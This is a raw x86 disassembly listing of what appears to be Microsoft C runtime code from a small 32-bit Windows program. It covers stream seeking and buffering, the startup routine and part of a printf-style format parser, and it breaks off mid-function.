  401f21:	c7 46 18 00 02 00 00 	movl   $0x200,0x18(%esi)
  401f28:	57                   	push   %edi
  401f29:	ff 74 24 14          	push   0x14(%esp)
  401f2d:	ff 76 10             	push   0x10(%esi)
  401f30:	e8 b0 0e 00 00       	call   0x402de5
  401f35:	83 c4 0c             	add    $0xc,%esp
  401f38:	33 c9                	xor    %ecx,%ecx
  401f3a:	83 f8 ff             	cmp    $0xffffffff,%eax
  401f3d:	0f 95 c1             	setne  %cl
  401f40:	49                   	dec    %ecx
  401f41:	8b c1                	mov    %ecx,%eax
  401f43:	eb 0d                	jmp    0x401f52
  401f45:	c7 05 e4 bd 40 00 16 	movl   $0x16,0x40bde4
  401f4c:	00 00 00 
  401f4f:	83 c8 ff             	or     $0xffffffff,%eax
  401f52:	5f                   	pop    %edi
  401f53:	5e                   	pop    %esi
  401f54:	c3                   	ret
  401f55:	55                   	push   %ebp
  401f56:	8b ec                	mov    %esp,%ebp
  401f58:	83 ec 0c             	sub    $0xc,%esp
  401f5b:	53                   	push   %ebx
  401f5c:	56                   	push   %esi
  401f5d:	57                   	push   %edi
  401f5e:	8b 7d 08             	mov    0x8(%ebp),%edi
  401f61:	33 db                	xor    %ebx,%ebx
  401f63:	8b 77 10             	mov    0x10(%edi),%esi
  401f66:	39 5f 04             	cmp    %ebx,0x4(%edi)
  401f69:	89 75 f4             	mov    %esi,-0xc(%ebp)
  401f6c:	7d 03                	jge    0x401f71
  401f6e:	89 5f 04             	mov    %ebx,0x4(%edi)
  401f71:	6a 01                	push   $0x1
  401f73:	53                   	push   %ebx
  401f74:	56                   	push   %esi
  401f75:	e8 6b 0e 00 00       	call   0x402de5
  401f7a:	83 c4 0c             	add    $0xc,%esp
  401f7d:	3b c3                	cmp    %ebx,%eax
  401f7f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401f82:	7c 5b                	jl     0x401fdf
  401f84:	8b 57 0c             	mov    0xc(%edi),%edx
  401f87:	66 f7 c2 08 01       	test   $0x108,%dx
  401f8c:	75 08                	jne    0x401f96
  401f8e:	2b 47 04             	sub    0x4(%edi),%eax
  401f91:	e9 12 01 00 00       	jmp    0x4020a8
  401f96:	8b 07                	mov    (%edi),%eax
  401f98:	8b 4f 08             	mov    0x8(%edi),%ecx
  401f9b:	8b d8                	mov    %eax,%ebx
  401f9d:	2b d9                	sub    %ecx,%ebx
  401f9f:	f6 c2 03             	test   $0x3,%dl
  401fa2:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  401fa5:	74 29                	je     0x401fd0
  401fa7:	8b d6                	mov    %esi,%edx
  401fa9:	8b de                	mov    %esi,%ebx
  401fab:	c1 fa 05             	sar    $0x5,%edx
  401fae:	83 e3 1f             	and    $0x1f,%ebx
  401fb1:	8b 14 95 e0 c1 40 00 	mov    0x40c1e0(,%edx,4),%edx
  401fb8:	f6 44 da 04 80       	testb  $0x80,0x4(%edx,%ebx,8)
  401fbd:	74 28                	je     0x401fe7
  401fbf:	8b d1                	mov    %ecx,%edx
  401fc1:	3b d0                	cmp    %eax,%edx
  401fc3:	73 22                	jae    0x401fe7
  401fc5:	80 3a 0a             	cmpb   $0xa,(%edx)
  401fc8:	75 03                	jne    0x401fcd
  401fca:	ff 45 f8             	incl   -0x8(%ebp)
  401fcd:	42                   	inc    %edx
  401fce:	eb f1                	jmp    0x401fc1
  401fd0:	f6 c2 80             	test   $0x80,%dl
  401fd3:	75 12                	jne    0x401fe7
  401fd5:	c7 05 e4 bd 40 00 16 	movl   $0x16,0x40bde4
  401fdc:	00 00 00 
  401fdf:	83 c8 ff             	or     $0xffffffff,%eax
  401fe2:	e9 c1 00 00 00       	jmp    0x4020a8
  401fe7:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401feb:	75 08                	jne    0x401ff5
  401fed:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401ff0:	e9 b3 00 00 00       	jmp    0x4020a8
  401ff5:	f6 47 0c 01          	testb  $0x1,0xc(%edi)
  401ff9:	0f 84 a1 00 00 00    	je     0x4020a0
  401fff:	8b 57 04             	mov    0x4(%edi),%edx
  402002:	85 d2                	test   %edx,%edx
  402004:	75 08                	jne    0x40200e
  402006:	21 55 f8             	and    %edx,-0x8(%ebp)
  402009:	e9 92 00 00 00       	jmp    0x4020a0
  40200e:	2b c1                	sub    %ecx,%eax
  402010:	03 c2                	add    %edx,%eax
  402012:	89 45 08             	mov    %eax,0x8(%ebp)
  402015:	8b c6                	mov    %esi,%eax
  402017:	c1 f8 05             	sar    $0x5,%eax
  40201a:	83 e6 1f             	and    $0x1f,%esi
  40201d:	8d 1c 85 e0 c1 40 00 	lea    0x40c1e0(,%eax,4),%ebx
  402024:	c1 e6 03             	shl    $0x3,%esi
  402027:	8b 03                	mov    (%ebx),%eax
  402029:	f6 44 06 04 80       	testb  $0x80,0x4(%esi,%eax,1)
  40202e:	74 6a                	je     0x40209a
  402030:	6a 02                	push   $0x2
  402032:	6a 00                	push   $0x0
  402034:	ff 75 f4             	push   -0xc(%ebp)
  402037:	e8 a9 0d 00 00       	call   0x402de5
  40203c:	83 c4 0c             	add    $0xc,%esp
  40203f:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  402042:	75 1d                	jne    0x402061
  402044:	8b 47 08             	mov    0x8(%edi),%eax
  402047:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40204a:	03 c8                	add    %eax,%ecx
  40204c:	3b c1                	cmp    %ecx,%eax
  40204e:	73 0b                	jae    0x40205b
  402050:	80 38 0a             	cmpb   $0xa,(%eax)
  402053:	75 03                	jne    0x402058
  402055:	ff 45 08             	incl   0x8(%ebp)
  402058:	40                   	inc    %eax
  402059:	eb f1                	jmp    0x40204c
  40205b:	f6 47 0d 20          	testb  $0x20,0xd(%edi)
  40205f:	eb 34                	jmp    0x402095
  402061:	6a 00                	push   $0x0
  402063:	ff 75 fc             	push   -0x4(%ebp)
  402066:	ff 75 f4             	push   -0xc(%ebp)
  402069:	e8 77 0d 00 00       	call   0x402de5
  40206e:	b8 00 02 00 00       	mov    $0x200,%eax
  402073:	83 c4 0c             	add    $0xc,%esp
  402076:	39 45 08             	cmp    %eax,0x8(%ebp)
  402079:	77 0d                	ja     0x402088
  40207b:	8b 4f 0c             	mov    0xc(%edi),%ecx
  40207e:	f6 c1 08             	test   $0x8,%cl
  402081:	74 05                	je     0x402088
  402083:	f6 c5 04             	test   $0x4,%ch
  402086:	74 03                	je     0x40208b
  402088:	8b 47 18             	mov    0x18(%edi),%eax
  40208b:	89 45 08             	mov    %eax,0x8(%ebp)
  40208e:	8b 03                	mov    (%ebx),%eax
  402090:	f6 44 06 04 04       	testb  $0x4,0x4(%esi,%eax,1)
  402095:	74 03                	je     0x40209a
  402097:	ff 45 08             	incl   0x8(%ebp)
  40209a:	8b 45 08             	mov    0x8(%ebp),%eax
  40209d:	29 45 fc             	sub    %eax,-0x4(%ebp)
  4020a0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4020a3:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4020a6:	03 c1                	add    %ecx,%eax
  4020a8:	5f                   	pop    %edi
  4020a9:	5e                   	pop    %esi
  4020aa:	5b                   	pop    %ebx
  4020ab:	c9                   	leave
  4020ac:	c3                   	ret
  4020ad:	55                   	push   %ebp
  4020ae:	8b ec                	mov    %esp,%ebp
  4020b0:	56                   	push   %esi
  4020b1:	57                   	push   %edi
  4020b2:	ff 75 08             	push   0x8(%ebp)
  4020b5:	e8 3f 02 00 00       	call   0x4022f9
  4020ba:	8b f0                	mov    %eax,%esi
  4020bc:	8d 45 10             	lea    0x10(%ebp),%eax
  4020bf:	50                   	push   %eax
  4020c0:	ff 75 0c             	push   0xc(%ebp)
  4020c3:	ff 75 08             	push   0x8(%ebp)
  4020c6:	e8 f8 02 00 00       	call   0x4023c3
  4020cb:	ff 75 08             	push   0x8(%ebp)
  4020ce:	8b f8                	mov    %eax,%edi
  4020d0:	56                   	push   %esi
  4020d1:	e8 b0 02 00 00       	call   0x402386
  4020d6:	83 c4 18             	add    $0x18,%esp
  4020d9:	8b c7                	mov    %edi,%eax
  4020db:	5f                   	pop    %edi
  4020dc:	5e                   	pop    %esi
  4020dd:	5d                   	pop    %ebp
  4020de:	c3                   	ret
  4020df:	55                   	push   %ebp
  4020e0:	8b ec                	mov    %esp,%ebp
  4020e2:	83 ec 20             	sub    $0x20,%esp
  4020e5:	8b 45 08             	mov    0x8(%ebp),%eax
  4020e8:	56                   	push   %esi
  4020e9:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4020ec:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4020ef:	8d 45 10             	lea    0x10(%ebp),%eax
  4020f2:	c7 45 ec 42 00 00 00 	movl   $0x42,-0x14(%ebp)
  4020f9:	50                   	push   %eax
  4020fa:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4020fd:	ff 75 0c             	push   0xc(%ebp)
  402100:	c7 45 e4 ff ff ff 7f 	movl   $0x7fffffff,-0x1c(%ebp)
  402107:	50                   	push   %eax
  402108:	e8 b6 02 00 00       	call   0x4023c3
  40210d:	83 c4 0c             	add    $0xc,%esp
  402110:	ff 4d e4             	decl   -0x1c(%ebp)
  402113:	8b f0                	mov    %eax,%esi
  402115:	78 08                	js     0x40211f
  402117:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40211a:	80 20 00             	andb   $0x0,(%eax)
  40211d:	eb 0d                	jmp    0x40212c
  40211f:	8d 45 e0             	lea    -0x20(%ebp),%eax
  402122:	50                   	push   %eax
  402123:	6a 00                	push   $0x0
  402125:	e8 0d 10 00 00       	call   0x403137
  40212a:	59                   	pop    %ecx
  40212b:	59                   	pop    %ecx
  40212c:	8b c6                	mov    %esi,%eax
  40212e:	5e                   	pop    %esi
  40212f:	c9                   	leave
  402130:	c3                   	ret
  402131:	56                   	push   %esi
  402132:	8b 74 24 08          	mov    0x8(%esp),%esi
  402136:	57                   	push   %edi
  402137:	83 cf ff             	or     $0xffffffff,%edi
  40213a:	8b 46 0c             	mov    0xc(%esi),%eax
  40213d:	a8 40                	test   $0x40,%al
  40213f:	74 05                	je     0x402146
  402141:	83 c8 ff             	or     $0xffffffff,%eax
  402144:	eb 3a                	jmp    0x402180
  402146:	a8 83                	test   $0x83,%al
  402148:	74 34                	je     0x40217e
  40214a:	56                   	push   %esi
  40214b:	e8 6a 0d 00 00       	call   0x402eba
  402150:	56                   	push   %esi
  402151:	8b f8                	mov    %eax,%edi
  402153:	e8 10 12 00 00       	call   0x403368
  402158:	ff 76 10             	push   0x10(%esi)
  40215b:	e8 55 11 00 00       	call   0x4032b5
  402160:	83 c4 0c             	add    $0xc,%esp
  402163:	85 c0                	test   %eax,%eax
  402165:	7d 05                	jge    0x40216c
  402167:	83 cf ff             	or     $0xffffffff,%edi
  40216a:	eb 12                	jmp    0x40217e
  40216c:	8b 46 1c             	mov    0x1c(%esi),%eax
  40216f:	85 c0                	test   %eax,%eax
  402171:	74 0b                	je     0x40217e
  402173:	50                   	push   %eax
  402174:	e8 d3 10 00 00       	call   0x40324c
  402179:	83 66 1c 00          	andl   $0x0,0x1c(%esi)
  40217d:	59                   	pop    %ecx
  40217e:	8b c7                	mov    %edi,%eax
  402180:	83 66 0c 00          	andl   $0x0,0xc(%esi)
  402184:	5f                   	pop    %edi
  402185:	5e                   	pop    %esi
  402186:	c3                   	ret
  402187:	e8 77 13 00 00       	call   0x403503
  40218c:	85 c0                	test   %eax,%eax
  40218e:	75 01                	jne    0x402191
  402190:	c3                   	ret
  402191:	50                   	push   %eax
  402192:	ff 74 24 10          	push   0x10(%esp)
  402196:	ff 74 24 10          	push   0x10(%esp)
  40219a:	ff 74 24 10          	push   0x10(%esp)
  40219e:	e8 f0 11 00 00       	call   0x403393
  4021a3:	83 c4 10             	add    $0x10,%esp
  4021a6:	c3                   	ret
  4021a7:	6a 40                	push   $0x40
  4021a9:	ff 74 24 0c          	push   0xc(%esp)
  4021ad:	ff 74 24 0c          	push   0xc(%esp)
  4021b1:	e8 d1 ff ff ff       	call   0x402187
  4021b6:	83 c4 0c             	add    $0xc,%esp
  4021b9:	c3                   	ret
  4021ba:	55                   	push   %ebp
  4021bb:	8b ec                	mov    %esp,%ebp
  4021bd:	6a ff                	push   $0xffffffff
  4021bf:	68 00 81 40 00       	push   $0x408100
  4021c4:	68 5c 3e 40 00       	push   $0x403e5c
  4021c9:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4021cf:	50                   	push   %eax
  4021d0:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4021d7:	83 ec 58             	sub    $0x58,%esp
  4021da:	53                   	push   %ebx
  4021db:	56                   	push   %esi
  4021dc:	57                   	push   %edi
  4021dd:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4021e0:	ff 15 50 80 40 00    	call   *0x408050
  4021e6:	33 d2                	xor    %edx,%edx
  4021e8:	8a d4                	mov    %ah,%dl
  4021ea:	89 15 fc bd 40 00    	mov    %edx,0x40bdfc
  4021f0:	8b c8                	mov    %eax,%ecx
  4021f2:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  4021f8:	89 0d f8 bd 40 00    	mov    %ecx,0x40bdf8
  4021fe:	c1 e1 08             	shl    $0x8,%ecx
  402201:	03 ca                	add    %edx,%ecx
  402203:	89 0d f4 bd 40 00    	mov    %ecx,0x40bdf4
  402209:	c1 e8 10             	shr    $0x10,%eax
  40220c:	a3 f0 bd 40 00       	mov    %eax,0x40bdf0
  402211:	33 f6                	xor    %esi,%esi
  402213:	56                   	push   %esi
  402214:	e8 eb 1a 00 00       	call   0x403d04
  402219:	59                   	pop    %ecx
  40221a:	85 c0                	test   %eax,%eax
  40221c:	75 08                	jne    0x402226
  40221e:	6a 1c                	push   $0x1c
  402220:	e8 b0 00 00 00       	call   0x4022d5
  402225:	59                   	pop    %ecx
  402226:	89 75 fc             	mov    %esi,-0x4(%ebp)
  402229:	e8 5e 0d 00 00       	call   0x402f8c
  40222e:	ff 15 4c 80 40 00    	call   *0x40804c
  402234:	a3 04 d3 40 00       	mov    %eax,0x40d304
  402239:	e8 1f 18 00 00       	call   0x403a5d
  40223e:	a3 cc bd 40 00       	mov    %eax,0x40bdcc
  402243:	e8 c8 15 00 00       	call   0x403810
  402248:	e8 0a 15 00 00       	call   0x403757
  40224d:	e8 91 0a 00 00       	call   0x402ce3
  402252:	89 75 d0             	mov    %esi,-0x30(%ebp)
  402255:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  402258:	50                   	push   %eax
  402259:	ff 15 48 80 40 00    	call   *0x408048
  40225f:	e8 9b 14 00 00       	call   0x4036ff
  402264:	89 45 9c             	mov    %eax,-0x64(%ebp)
  402267:	f6 45 d0 01          	testb  $0x1,-0x30(%ebp)
  40226b:	74 06                	je     0x402273
  40226d:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  402271:	eb 03                	jmp    0x402276
  402273:	6a 0a                	push   $0xa
  402275:	58                   	pop    %eax
  402276:	50                   	push   %eax
  402277:	ff 75 9c             	push   -0x64(%ebp)
  40227a:	56                   	push   %esi
  40227b:	56                   	push   %esi
  40227c:	ff 15 00 80 40 00    	call   *0x408000
  402282:	50                   	push   %eax
  402283:	e8 78 ed ff ff       	call   0x401000
  402288:	89 45 a0             	mov    %eax,-0x60(%ebp)
  40228b:	50                   	push   %eax
  40228c:	e8 7f 0a 00 00       	call   0x402d10
  402291:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402294:	8b 08                	mov    (%eax),%ecx
  402296:	8b 09                	mov    (%ecx),%ecx
  402298:	89 4d 98             	mov    %ecx,-0x68(%ebp)
  40229b:	50                   	push   %eax
  40229c:	51                   	push   %ecx
  40229d:	e8 d9 12 00 00       	call   0x40357b
  4022a2:	59                   	pop    %ecx
  4022a3:	59                   	pop    %ecx
  4022a4:	c3                   	ret
  4022a5:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4022a8:	ff 75 98             	push   -0x68(%ebp)
  4022ab:	e8 71 0a 00 00       	call   0x402d21
  4022b0:	83 3d d4 bd 40 00 01 	cmpl   $0x1,0x40bdd4
  4022b7:	75 05                	jne    0x4022be
  4022b9:	e8 76 1c 00 00       	call   0x403f34
  4022be:	ff 74 24 04          	push   0x4(%esp)
  4022c2:	e8 a6 1c 00 00       	call   0x403f6d
  4022c7:	68 ff 00 00 00       	push   $0xff
  4022cc:	ff 15 70 92 40 00    	call   *0x409270
  4022d2:	59                   	pop    %ecx
  4022d3:	59                   	pop    %ecx
  4022d4:	c3                   	ret
  4022d5:	83 3d d4 bd 40 00 01 	cmpl   $0x1,0x40bdd4
  4022dc:	75 05                	jne    0x4022e3
  4022de:	e8 51 1c 00 00       	call   0x403f34
  4022e3:	ff 74 24 04          	push   0x4(%esp)
  4022e7:	e8 81 1c 00 00       	call   0x403f6d
  4022ec:	59                   	pop    %ecx
  4022ed:	68 ff 00 00 00       	push   $0xff
  4022f2:	ff 15 54 80 40 00    	call   *0x408054
  4022f8:	c3                   	ret
  4022f9:	56                   	push   %esi
  4022fa:	8b 74 24 08          	mov    0x8(%esp),%esi
  4022fe:	ff 76 10             	push   0x10(%esi)
  402301:	e8 6c 1e 00 00       	call   0x404172
  402306:	85 c0                	test   %eax,%eax
  402308:	59                   	pop    %ecx
  402309:	74 77                	je     0x402382
  40230b:	81 fe a0 92 40 00    	cmp    $0x4092a0,%esi
  402311:	75 04                	jne    0x402317
  402313:	33 c0                	xor    %eax,%eax
  402315:	eb 0b                	jmp    0x402322
  402317:	81 fe c0 92 40 00    	cmp    $0x4092c0,%esi
  40231d:	75 63                	jne    0x402382
  40231f:	6a 01                	push   $0x1
  402321:	58                   	pop    %eax
  402322:	ff 05 e0 bd 40 00    	incl   0x40bde0
  402328:	66 f7 46 0c 0c 01    	testw  $0x10c,0xc(%esi)
  40232e:	75 52                	jne    0x402382
  402330:	83 3c 85 d8 bd 40 00 	cmpl   $0x0,0x40bdd8(,%eax,4)
  402337:	00 
  402338:	53                   	push   %ebx
  402339:	57                   	push   %edi
  40233a:	8d 3c 85 d8 bd 40 00 	lea    0x40bdd8(,%eax,4),%edi
  402341:	bb 00 10 00 00       	mov    $0x1000,%ebx
  402346:	75 20                	jne    0x402368
  402348:	53                   	push   %ebx
  402349:	e8 72 1d 00 00       	call   0x4040c0
  40234e:	85 c0                	test   %eax,%eax
  402350:	59                   	pop    %ecx
  402351:	89 07                	mov    %eax,(%edi)
  402353:	75 13                	jne    0x402368
  402355:	8d 46 14             	lea    0x14(%esi),%eax
  402358:	6a 02                	push   $0x2
  40235a:	89 46 08             	mov    %eax,0x8(%esi)
  40235d:	89 06                	mov    %eax,(%esi)
  40235f:	58                   	pop    %eax
  402360:	89 46 18             	mov    %eax,0x18(%esi)
  402363:	89 46 04             	mov    %eax,0x4(%esi)
  402366:	eb 0d                	jmp    0x402375
  402368:	8b 3f                	mov    (%edi),%edi
  40236a:	89 5e 18             	mov    %ebx,0x18(%esi)
  40236d:	89 7e 08             	mov    %edi,0x8(%esi)
  402370:	89 3e                	mov    %edi,(%esi)
  402372:	89 5e 04             	mov    %ebx,0x4(%esi)
  402375:	66 81 4e 0c 02 11    	orw    $0x1102,0xc(%esi)
  40237b:	6a 01                	push   $0x1
  40237d:	58                   	pop    %eax
  40237e:	5f                   	pop    %edi
  40237f:	5b                   	pop    %ebx
  402380:	5e                   	pop    %esi
  402381:	c3                   	ret
  402382:	33 c0                	xor    %eax,%eax
  402384:	5e                   	pop    %esi
  402385:	c3                   	ret
  402386:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  40238b:	56                   	push   %esi
  40238c:	74 22                	je     0x4023b0
  40238e:	8b 74 24 0c          	mov    0xc(%esp),%esi
  402392:	f6 46 0d 10          	testb  $0x10,0xd(%esi)
  402396:	74 29                	je     0x4023c1
  402398:	56                   	push   %esi
  402399:	e8 1c 0b 00 00       	call   0x402eba
  40239e:	80 66 0d ee          	andb   $0xee,0xd(%esi)
  4023a2:	83 66 18 00          	andl   $0x0,0x18(%esi)
  4023a6:	83 26 00             	andl   $0x0,(%esi)
  4023a9:	83 66 08 00          	andl   $0x0,0x8(%esi)
  4023ad:	59                   	pop    %ecx
  4023ae:	5e                   	pop    %esi
  4023af:	c3                   	ret
  4023b0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4023b4:	f6 40 0d 10          	testb  $0x10,0xd(%eax)
  4023b8:	74 07                	je     0x4023c1
  4023ba:	50                   	push   %eax
  4023bb:	e8 fa 0a 00 00       	call   0x402eba
  4023c0:	59                   	pop    %ecx
  4023c1:	5e                   	pop    %esi
  4023c2:	c3                   	ret
  4023c3:	55                   	push   %ebp
  4023c4:	8b ec                	mov    %esp,%ebp
  4023c6:	81 ec 4c 02 00 00    	sub    $0x24c,%esp
  4023cc:	53                   	push   %ebx
  4023cd:	56                   	push   %esi
  4023ce:	8b 75 0c             	mov    0xc(%ebp),%esi
  4023d1:	33 c9                	xor    %ecx,%ecx
  4023d3:	57                   	push   %edi
  4023d4:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4023d7:	8a 1e                	mov    (%esi),%bl
  4023d9:	46                   	inc    %esi
  4023da:	84 db                	test   %bl,%bl
  4023dc:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4023df:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  4023e2:	89 75 0c             	mov    %esi,0xc(%ebp)
  4023e5:	0f 84 4e 07 00 00    	je     0x402b39
  4023eb:	bf 00 08 00 00       	mov    $0x800,%edi
  4023f0:	ba 00 02 00 00       	mov    $0x200,%edx
  4023f5:	eb 0d                	jmp    0x402404
  4023f7:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4023fa:	ba 00 02 00 00       	mov    $0x200,%edx
  4023ff:	bf 00 08 00 00       	mov    $0x800,%edi
  402404:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  402408:	0f 8c 2b 07 00 00    	jl     0x402b39
  40240e:	80 fb 20             	cmp    $0x20,%bl
  402411:	7c 13                	jl     0x402426
  402413:	80 fb 78             	cmp    $0x78,%bl
  402416:	7f 0e                	jg     0x402426
  402418:	0f be c3             	movsbl %bl,%eax
  40241b:	8a 80 ec 80 40 00    	mov    0x4080ec(%eax),%al
  402421:	83 e0 0f             	and    $0xf,%eax
  402424:	eb 02                	jmp    0x402428
  402426:	33 c0                	xor    %eax,%eax
  402428:	0f be 84 c1 0c 81 40 	movsbl 0x40810c(%ecx,%eax,8),%eax
  40242f:	00 
  402430:	c1 f8 04             	sar    $0x4,%eax
  402433:	83 f8 07             	cmp    $0x7,%eax
  402436:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  402439:	0f 87 e9 06 00 00    	ja     0x402b28
  40243f:	ff 24 85 41 2b 40 00 	jmp    *0x402b41(,%eax,4)
  402446:	33 c0                	xor    %eax,%eax
  402448:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  40244c:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40244f:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402452:	89 45 d8             	mov    %eax,-0x28(%ebp)
  402455:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402458:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40245b:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40245e:	e9 c5 06 00 00       	jmp    0x402b28
  402463:	0f be c3             	movsbl %bl,%eax
  402466:	83 e8 20             	sub    $0x20,%eax
  402469:	74 3b                	je     0x4024a6
  40246b:	83 e8 03             	sub    $0x3,%eax
  40246e:	74 2d                	je     0x40249d
  402470:	83 e8 08             	sub    $0x8,%eax
  402473:	74 1f                	je     0x402494
  402475:	48                   	dec    %eax
  402476:	48                   	dec    %eax
  402477:	74 12                	je     0x40248b
  402479:	83 e8 03             	sub    $0x3,%eax
  40247c:	0f 85 a6 06 00 00    	jne    0x402b28
  402482:	83 4d fc 08          	orl    $0x8,-0x4(%ebp)
  402486:	e9 9d 06 00 00       	jmp    0x402b28
  40248b:	83 4d fc 04          	orl    $0x4,-0x4(%ebp)
  40248f:	e9 94 06 00 00       	jmp    0x402b28
  402494:	83 4d fc 01          	orl    $0x1,-0x4(%ebp)
  402498:	e9 8b 06 00 00       	jmp    0x402b28
  40249d:	80 4d fc 80          	orb    $0x80,-0x4(%ebp)
  4024a1:	e9 82 06 00 00       	jmp    0x402b28
  4024a6:	83 4d fc 02          	orl    $0x2,-0x4(%ebp)
  4024aa:	e9 79 06 00 00       	jmp    0x402b28
  4024af:	80 fb 2a             	cmp    $0x2a,%bl
  4024b2:	75 23                	jne    0x4024d7
  4024b4:	8d 45 10             	lea    0x10(%ebp),%eax
  4024b7:	50                   	push   %eax
  4024b8:	e8 42 07 00 00       	call   0x402bff
  4024bd:	85 c0                	test   %eax,%eax
  4024bf:	59                   	pop    %ecx
  4024c0:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4024c3:	0f 8d 5f 06 00 00    	jge    0x402b28
  4024c9:	83 4d fc 04          	orl    $0x4,-0x4(%ebp)
  4024cd:	f7 d8                	neg    %eax
  4024cf:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4024d2:	e9 51 06 00 00       	jmp    0x402b28
  4024d7:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4024da:	0f be cb             	movsbl %bl,%ecx
  4024dd:	8d 04 80             	lea    (%eax,%eax,4),%eax
  4024e0:	8d 44 41 d0          	lea    -0x30(%ecx,%eax,2),%eax
  4024e4:	eb e9                	jmp    0x4024cf
  4024e6:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  4024ea:	e9 39 06 00 00       	jmp    0x402b28
  4024ef:	80 fb 2a             	cmp    $0x2a,%bl
  4024f2:	75 1e                	jne    0x402512
  4024f4:	8d 45 10             	lea    0x10(%ebp),%eax
  4024f7:	50                   	push   %eax
  4024f8:	e8 02 07 00 00       	call   0x402bff
  4024fd:	85 c0                	test   %eax,%eax
  4024ff:	59                   	pop    %ecx
  402500:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402503:	0f 8d 1f 06 00 00    	jge    0x402b28
  402509:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  40250d:	e9 16 06 00 00       	jmp    0x402b28
  402512:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402515:	0f be cb             	movsbl %bl,%ecx
  402518:	8d 04 80             	lea    (%eax,%eax,4),%eax
  40251b:	8d 44 41 d0          	lea    -0x30(%ecx,%eax,2),%eax
  40251f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402522:	e9 01 06 00 00       	jmp    0x402b28
  402527:	80 fb 49             	cmp    $0x49,%bl
  40252a:	74 2d                	je     0x402559
  40252c:	80 fb 68             	cmp    $0x68,%bl
  40252f:	74 1f                	je     0x402550
  402531:	80 fb 6c             	cmp    $0x6c,%bl
  402534:	74 11                	je     0x402547
  402536:	80 fb 77             	cmp    $0x77,%bl
  402539:	0f 85 e9 05 00 00    	jne    0x402b28
  40253f:	09 7d fc             	or     %edi,-0x4(%ebp)
  402542:	e9 e1 05 00 00       	jmp    0x402b28
  402547:	83 4d fc 10          	orl    $0x10,-0x4(%ebp)
  40254b:	e9 d8 05 00 00       	jmp    0x402b28
  402550:	83 4d fc 20          	orl    $0x20,-0x4(%ebp)
  402554:	e9 cf 05 00 00       	jmp    0x402b28
  402559:	80 3e 36             	cmpb   $0x36,(%esi)
  40255c:	75 14                	jne    0x402572
  40255e:	80 7e 01 34          	cmpb   $0x34,0x1(%esi)
  402562:	75 0e                	jne    0x402572
  402564:	46                   	inc    %esi
  402565:	46                   	inc    %esi
  402566:	80 4d fd 80          	orb    $0x80,-0x3(%ebp)
  40256a:	89 75 0c             	mov    %esi,0xc(%ebp)
  40256d:	e9 b6 05 00 00       	jmp    0x402b28
  402572:	83 65 c4 00          	andl   $0x0,-0x3c(%ebp)
  402576:	8b 0d 58 96 40 00    	mov    0x409658,%ecx
  40257c:	83 65 d4 00          	andl   $0x0,-0x2c(%ebp)
  402580:	0f b6 c3             	movzbl %bl,%eax
  402583:	f6 44 41 01 80       	testb  $0x80,0x1(%ecx,%eax,2)
  402588:	74 19                	je     0x4025a3
  40258a:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40258d:	50                   	push   %eax
  40258e:	ff 75 08             	push   0x8(%ebp)
  402591:	0f be c3             	movsbl %bl,%eax
  402594:	50                   	push   %eax
  402595:	e8 c7 05 00 00       	call   0x402b61
  40259a:	8a 1e                	mov    (%esi),%bl
  40259c:	83 c4 0c             	add    $0xc,%esp
  40259f:	46                   	inc    %esi
  4025a0:	89 75 0c             	mov    %esi,0xc(%ebp)
  4025a3:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4025a6:	50                   	push   %eax
  4025a7:	ff 75 08             	push   0x8(%ebp)
  4025aa:	0f be c3             	movsbl %bl,%eax
  4025ad:	50                   	push   %eax
  4025ae:	e8 ae 05 00 00       	call   0x402b61
  4025b3:	83 c4 0c             	add    $0xc,%esp
  4025b6:	e9 6d 05 00 00       	jmp    0x402b28
  4025bb:	0f be c3             	movsbl %bl,%eax
  4025be:	83 f8 67             	cmp    $0x67,%eax
  4025c1:	0f 8f 38 02 00 00    	jg     0x4027ff
  4025c7:	83 f8 65             	cmp    $0x65,%eax
  4025ca:	0f 8d 96 00 00 00    	jge    0x402666
  4025d0:	83 f8 58             	cmp    $0x58,%eax
  4025d3:	0f 8f ec 00 00 00    	jg     0x4026c5
  4025d9:	0f 84 94 02 00 00    	je     0x402873
  4025df:	83 e8 43             	sub    $0x43,%eax
  4025e2:	0f 84 a1 00 00 00    	je     0x402689
  4025e8:	48                   	dec    %eax
  4025e9:	48                   	dec    %eax
